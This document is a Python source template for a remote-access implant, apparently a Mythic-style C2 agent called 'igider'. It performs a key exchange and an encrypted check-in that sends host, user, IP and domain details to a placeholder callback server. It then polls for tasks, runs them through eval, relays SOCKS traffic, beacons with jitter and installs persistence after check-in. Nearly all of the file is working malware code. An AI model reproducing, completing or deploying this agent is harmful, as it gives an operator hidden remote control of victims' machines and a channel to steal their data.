import os
import random
import sys
import json
import socket
import base64
import time
import platform
import ssl
import getpass
import urllib.request
from datetime import datetime
import threading
import queue





CHUNK_SIZE = 51200

CRYPTO_MODULE_PLACEHOLDER


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()


    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
            
   
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        try:
            if not data:
                return {}
            if isinstance(data, str):
                decoded_data = data
            else:
                decoded_data = data.decode('utf-8')
            json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
            if not json_data.strip():
                return {}
            return json.loads(json_data)
        except UnicodeDecodeError as e:
            try:
                decoded_data = data.decode('latin-1')
                json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
                if not json_data.strip():
                    return {}
                return json.loads(json_data)
            except Exception as e2:
                return {}
        except json.JSONDecodeError as e:
            return {}

 
    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))


    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

 
    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

   
    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error


    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    
    def perform_key_exchange(self):
        """Perform initial key exchange with server - no encryption needed"""
        try:
            data = {
                "action": "key_exchange",
                "uuid": self.agent_config["PayloadUUID"]
            }
            # Send unencrypted key exchange request
            encoded_data = base64.b64encode(json.dumps(data).encode())
            response = self.makeRequest(encoded_data, 'POST')
            
            if not response:
                logger.error("No response received during key exchange")
                return False
                
            # Decode response (should be unencrypted)
            try:
                decoded_response = base64.b64decode(response)
                response_json = json.loads(decoded_response.decode())
            except Exception as e:
                logger.error(f"Failed to decode key exchange response: {str(e)}")
                return False
                
            # Validate and store keys
            if (response_json.get("action") == "key_exchange_response" and 
                response_json.get("status") == "success"):
                
                self.agent_config["agent_to_server_key"] = response_json["encryption_key"]
                self.agent_config["server_to_agent_key"] = response_json["decryption_key"]
                
                logger.info("Key exchange successful")
                logger.debug(f"Agent-to-server key: {self.agent_config['agent_to_server_key'][:10]}...")
                logger.debug(f"Server-to-agent key: {self.agent_config['server_to_agent_key'][:10]}...")
                return True
            else:
                logger.error(f"Invalid key exchange response: {response_json}")
                return False
                
        except Exception as e:
            logger.error(f"Key exchange failed: {str(e)}")
            return False

    def checkIn(self):
        """Perform encrypted checkin after key exchange is complete"""
        try:
            # Ensure we have encryption keys
            if not self.agent_config.get("agent_to_server_key") or not self.agent_config.get("server_to_agent_key"):
                logger.error("Cannot checkin without encryption keys")
                return False
                
            hostname = socket.gethostname()
            ip = ''
            if hostname and len(hostname) > 0:
                try:
                    ip = socket.gethostbyname(hostname)
                except:
                    pass

            data = {
                "action": "checkin",
                "ip": ip,
                "os": self.getOSVersion(),
                "user": self.getUsername(),
                "host": hostname,
                "domain": socket.getfqdn(),
                "pid": os.getpid(),
                "uuid": self.agent_config["PayloadUUID"],
                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            }
            
            # Use the formatMessage method which handles encryption and UUID prepending
            encoded_data = self.formatMessage(data)
            if not encoded_data:
                logger.error("Failed to format checkin message")
                return False
                
            response = self.makeRequest(encoded_data, 'POST')
            if not response:
                logger.error("No response received from checkin request")
                return False
                
            # Decrypt and parse response
            decoded_data = self.decrypt(response)
            if not decoded_data:
                logger.error("Failed to decrypt checkin response")
                return False
                
            try:
                # Remove UUID prefix from response
                json_str = decoded_data.decode()
                if json_str.startswith(self.agent_config["PayloadUUID"]):
                    json_str = json_str.replace(self.agent_config["PayloadUUID"], "", 1)
                    
                response_json = json.loads(json_str)
                
                if "status" in response_json and "id" in response_json:
                    self.agent_config["UUID"] = response_json["id"]
                    logger.info(f"Checkin successful, assigned UUID: {self.agent_config['UUID']}")
                    return True
                else:
                    logger.error(f"Invalid checkin response: {response_json}")
                    return False
                    
            except json.JSONDecodeError as e:
                logger.error(f"Failed to parse checkin response: {str(e)}")
                return False
                
        except Exception as e:
            logger.error(f"Checkin failed: {str(e)}")
            return False


      
    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    
    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_PLACEHOLDER


    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }
        max_checkin_retries = 10
        checkin_retry_delay = 30

        # Attempt initial check-in with retries
        for attempt in range(max_checkin_retries):
            if self.checkIn():
                try:
                    self.create_persistence()
                    self.show_console_popup()
                except Exception as e:
                    pass
                break
            if attempt < max_checkin_retries - 1:
                time.sleep(checkin_retry_delay)
        else:
            os._exit(1)

        try:

            while True:
                    if self.passedKilldate():
                        self.exit(0)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except Exception as e:
                        # Retry tasking operations for a limited time
                        max_task_retries = 5
                        task_retry_delay = 10
                        for attempt in range(max_task_retries):
                            try:
                                self.getTaskings()
                                self.processTaskings()
                                self.postResponses()
                                break
                            except Exception as e2:
                                if attempt < max_task_retries - 1:
                                    time.sleep(task_retry_delay)
                        else:
                            pass
                    self.agentSleep()   
        except KeyboardInterrupt:
            self.exit(0)               

if __name__ == "__main__":
    igider = igider()
